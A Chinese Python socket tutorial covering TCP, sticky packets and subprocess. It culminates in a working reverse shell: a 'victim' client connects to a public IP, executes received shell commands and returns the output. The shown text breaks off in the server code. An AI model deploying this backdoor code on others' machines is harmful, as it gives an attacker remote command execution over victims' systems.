title="1.3套接字工作流程"></a>1.3套接字工作流程</h3><p>一个生活中的场景。你要打电话给一个朋友，先拨号，朋友听到电话铃声后提起电话，这时你和你的朋友就建立起了连接，就可以讲话了。等交流结束，挂断电话结束此次交谈。 生活中的场景就解释了这工作原理。</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/20211010155939.png" alt="img"></p><p>先从服务器端说起。服务器端先初始化Socket，然后与端口绑定(bind)，对端口进行监听(listen)，调用accept阻塞，等待客户端连接。在这时如果有个客户端初始化一个Socket，然后连接服务器(connect)，如果连接成功，这时客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把回应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束</p><h2 id="2-TCP套接字"><a href="#2-TCP套接字" class="headerlink" title="2.TCP套接字"></a>2.TCP套接字</h2><p>tcp协议知道吗 ? 三次握手 , 四次挥手呢 ? 计算机基础面试必问 , OSI七层啊 , 这些 , 其中tcp协议是传输层中的一种协议 , 简单回顾 , 直接上代码</p><h3 id="2-1单次通信"><a href="#2-1单次通信" class="headerlink" title="2.1单次通信"></a>2.1单次通信</h3><p>客户端代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.打电话,前提要知道对方的ip和port</span></span><br><span class="line">sock.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8080</span>))</span><br><span class="line"><span class="comment"># 3.发送数据</span></span><br><span class="line">sock.send(<span class="string">b&#x27;hello word&#x27;</span>)   <span class="comment"># 发送的数据必须是bytes类型</span></span><br><span class="line"><span class="comment"># 4.关闭</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><p>服务端代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.绑定手机卡</span></span><br><span class="line">sock.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>))  <span class="comment"># 1024以前都被系统占用了</span></span><br><span class="line"><span class="comment"># 3.开机</span></span><br><span class="line">sock.listen(<span class="number">5</span>)  <span class="comment"># 半连接池允许的个数5</span></span><br><span class="line"><span class="comment"># 4.等待连接请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;等待客户端连接......&quot;</span>)</span><br><span class="line">conn, client_addr = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;建立了一个管道: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(conn))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;客户端的地址: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(client_addr))</span><br><span class="line"><span class="comment"># 5.接收数据</span></span><br><span class="line">msg = conn.recv(<span class="number">1024</span>) <span class="comment"># 最大接收的数据量为1024个字节,收到的是bytes类型</span></span><br><span class="line"><span class="comment"># 6.打印数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;接收到的数据 : <span class="subst">&#123;msg.decode()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># 7.关闭管道连接(必选,回收资源的操作)</span></span><br><span class="line">conn.close()</span><br><span class="line"><span class="comment"># 8.关闭服务端sock对象(可选)</span></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><h3 id="2-2通信循环"><a href="#2-2通信循环" class="headerlink" title="2.2通信循环"></a>2.2通信循环</h3><p>是不是一直 , 一直 –&gt; 重复 –&gt; 循环 –&gt; while for</p><p>客户端代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 客户端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.打电话,前提要知道对方的ip和port</span></span><br><span class="line">sock.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>))</span><br><span class="line"><span class="comment"># 3.发送数据</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&#x27;请输入你要发送的数据&gt;&gt;&gt;&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">continue</span></span><br><span class="line">    sock.send(data.encode())</span><br><span class="line">    msg = sock.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p>服务端代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.买手机</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment"># 基于网络 , tcp协议,默认不写也是这个</span></span><br><span class="line"><span class="comment"># 2.绑定手机卡</span></span><br><span class="line">sock.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8080</span>)) </span><br><span class="line"><span class="comment"># 3.开机</span></span><br><span class="line">sock.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 4.等待连接请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;等待客户端连接......&quot;</span>)</span><br><span class="line">conn, client_addr = sock.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 5.接收数据</span></span><br><span class="line">        msg = conn.recv(<span class="number">1024</span>).decode()  <span class="comment"># 最大接收的数据量为1024个字节,收到的是bytes类型</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> msg: <span class="keyword">break</span>  <span class="comment"># 如果msg为空,意味是一种异常的行为,客户端非法断开,此时应该断开链接</span></span><br><span class="line">        <span class="comment"># 6.打印数据</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;接收到的数据 : <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># 7.回复客户端数据</span></span><br><span class="line">        conn.send(msg.upper().encode())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="comment"># 针对win</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">conn.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure><p><strong>粘包</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">须知：只有TCP有粘包现象，UDP永远不会粘包，为何，且听我娓娓道来</span><br><span class="line"></span><br><span class="line">例如基于tcp的套接字客户端往服务端上传文件，发送时文件内容是按照一段一段的字节流发送的，在接收方看了，根本不知道该文件的字节流从何处开始，在何处结束</span><br><span class="line"></span><br><span class="line">所谓粘包问题主要还是因为接收方不知道消息之间的界限，不知道一次性提取多少字节的数据所造成的。</span><br><span class="line"></span><br><span class="line">此外，发送方引起的粘包是由TCP协议本身造成的，TCP为提高传输效率，发送方往往要收集到足够多的数据后才发送一个TCP段。若连续几次需要send的数据都很少，通常TCP会根据优化算法把这些数据合成一个TCP段后一次发送出去，这样接收方就收到了粘包数据。</span><br></pre></td></tr></table></figure><p>解决粘包版本</p><p>客户端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct//解决lian</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 新增解包接收命令</span></span><br><span class="line">            msg = recv_data(client)  <span class="comment"># 接收对面传来的数据</span></span><br><span class="line">            <span class="keyword">if</span> msg == <span class="string">b&quot;q&quot;</span>:<span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(msg.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            <span class="comment"># 发送内容</span></span><br><span class="line">            msg = <span class="built_in">input</span>(<span class="string">&quot;请输入你要回复的内容:&quot;</span>).strip()</span><br><span class="line">            send_data(client, msg)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>服务端</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket()</span><br><span class="line">    server.bind((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    server.listen(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;等待链接.....&quot;</span>)</span><br><span class="line">    conn, c_addr = server.accept()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;新建一个链接,链接管道为<span class="subst">&#123;conn&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前客户端的地址为<span class="subst">&#123;c_addr&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">input</span>(<span class="string">f&#x27;请输入你要发送的内容&gt;&#x27;</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:<span class="keyword">continue</span></span><br><span class="line">            send_data(conn,data)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">&quot;q&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 接收客户端发来的内容</span></span><br><span class="line">            data = recv_data(conn)</span><br><span class="line">            <span class="built_in">print</span>(data.decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br><span class="line">    server.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>注意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先启动服务端</span><br><span class="line"></span><br><span class="line">客户端可以发送空 , 但是服务端这边是不能接收空的</span><br><span class="line"></span><br><span class="line">客户端的send和服务端的recv不是一 一对应的, 所有的send和recv都是和自己打交道, 还记得前面提到的那个应用是无法操作物理硬件的对吧,中间是通过操作系统, 那么你send也是, 操作系统会在缓存中拿到你应用send的数据, 然后交给网卡发送, 接收这边也是, 当应用中有recv操作时, 操作系统会到缓存中取数据, 那为什么发空会阻塞住呢?首先是send这边, 缓存中是空的, 操作系统取不到数据就溜溜球了, 但是接收方这边, 只要recv就会让操作系统去缓存哪里等着, 他不会因为当时没有数据, 就回来了, 他会一直在那里等着.所以阻塞了</span><br></pre></td></tr></table></figure><p>现在双方可以通信了 , 离我们的目标就差什么了?</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">是不是一方发送命令 , 另一方接收命令 , 然后执行命令, 并将命令执行后的结果再发送回去</span><br></pre></td></tr></table></figure><h2 id="3-subprocess模块"><a href="#3-subprocess模块" class="headerlink" title="3.subprocess模块"></a>3.subprocess模块</h2><p>也是一个内置模块 , 相对于os.system , 可以控制系统命令执行后的输出的编码方式 , 达到不乱码</p><p>小例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">obj = subprocess.Popen(<span class="string">&quot;whoami&quot;</span>, shell=<span class="literal">True</span>,</span><br><span class="line">                       stdout=subprocess.PIPE, <span class="comment"># 标准正确输出</span></span><br><span class="line">                       stderr=subprocess.PIPE) <span class="comment"># 标准错误输出</span></span><br><span class="line"><span class="comment"># 正确输出</span></span><br><span class="line">res = obj.stdout.read()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line"><span class="built_in">print</span>(res.decode(<span class="string">&#x27;gbk&#x27;</span>))  <span class="comment">#subprocess使用当前系统默认编码，得到结果为bytes类型，在windows下需要用gbk解码</span></span><br><span class="line"><span class="comment"># 错误输出</span></span><br><span class="line">res_err = obj.stderr.read()</span><br><span class="line"><span class="comment"># 打印</span></span><br><span class="line"><span class="built_in">print</span>(res_err)</span><br></pre></td></tr></table></figure><p>在我们原来的通信基础上 , 新增接收命令 , 并执行命令 , 然后发送命令执行的结果 , 解决了粘包</p><p>客户端代码(受害者)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接服务端 , 然后服务端发送命令 , 它接收 , 执行 , 然后执行结果发送给服务端</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec_cmd</span>(<span class="params">command</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;执行命令函数&quot;&quot;&quot;</span></span><br><span class="line">    obj = subprocess.Popen(command.decode(<span class="string">&quot;utf-8&quot;</span>), shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE,</span><br><span class="line">                           stdin=subprocess.PIPE)</span><br><span class="line">    stdout_res = obj.stdout.read() + obj.stderr.read()</span><br><span class="line">    <span class="keyword">return</span> stdout_res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">sock, data</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;发送数据也解决粘包问题&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data: <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(data) == <span class="built_in">str</span>:</span><br><span class="line">        data = data.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment"># 新增发送命令的粘包解决方案</span></span><br><span class="line">    <span class="comment"># 计算命令长度 , 打包发送</span></span><br><span class="line">    cmd_len = struct.pack(<span class="string">&#x27;i&#x27;</span>, <span class="built_in">len</span>(data))</span><br><span class="line">    sock.send(cmd_len)</span><br><span class="line">    <span class="comment"># 发送命令</span></span><br><span class="line">    sock.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    client = socket.socket()</span><br><span class="line">    client.connect((<span class="string">&#x27;119.3.12.54&#x27;</span>, <span class="number">8082</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 新增解包接收命令</span></span><br><span class="line">            cmd = recv_data(client)  <span class="comment"># 接收对面传来的数据</span></span><br><span class="line">            <span class="keyword">if</span> cmd == <span class="string">b&quot;q&quot;</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># 调用subprocess中的方法去执行这个系统命令</span></span><br><span class="line">            res = exec_cmd(cmd)</span><br><span class="line">            send_data(client, res)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>服务端代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">监听 , 等待链接 , 然后发送命令 , 接收命令执行的结果</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_data</span>(<span class="params">sock, buf_size=<span class="number">1024</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解决粘包&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 先接受命令执行结果的长度</span></span><br><span class="line">    x = sock.recv(<span class="number">4</span>)</span><br><span class="line">    all_size = struct.unpack(<span class="string">&#x27;i&#x27;</span>, x)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 接收真实数据</span></span><br><span class="line">    recv_size = <span class="number">0</span></span><br><span class="line">    data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> recv_size &lt; all_size:</span><br><span class="line">        data += sock.recv(buf_size)</span><br><span class="line">        recv_size += buf_size</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span 